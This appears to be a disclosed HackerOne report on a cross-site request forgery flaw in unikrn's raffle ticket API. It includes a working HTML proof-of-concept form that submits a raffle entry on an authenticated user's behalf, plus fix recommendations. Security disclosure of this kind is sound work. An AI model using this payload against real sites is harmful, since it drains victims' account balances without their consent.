# CSRF in Raffles Ticket Purchasing

## Report Details
- **Report ID**: 272588
- **URL**: https://hackerone.com/reports/272588
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-09-28T04:08:10.330Z
- **Disclosed**: 2018-04-10T02:10:08.175Z

## Reporter
- **Username**: tolo7010
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: unikrn

## Vulnerability Information
Description:
========

An API endpoint get executed with no CSRF prevention, the endpoint did not verify session_id required in the post form. An attacker can crafted malicious form (Poc), which is executed by authenticated user action leading to huge balance lost.

Poc:
===

<!doctype html>
<html>
<head>
</head> 
<body>
<form action="https://unikrn.com/apiv2/raffle/enter" method="POST" name="myForm">
<input type="hidden" name="raffle" id="raffle" value="4775">
<input type="hidden" name="tickets" id="tickets" value="1">
<input type="hidden" name="session_id" id="session_id" value="">
<input value="Submit" type="submit"">
</form>
</body>
</html>

Recommendations:
=============

- Implementing CSRF tokens.
- Validate session_id on post form/JSON api input.

## Attachments
No attachments
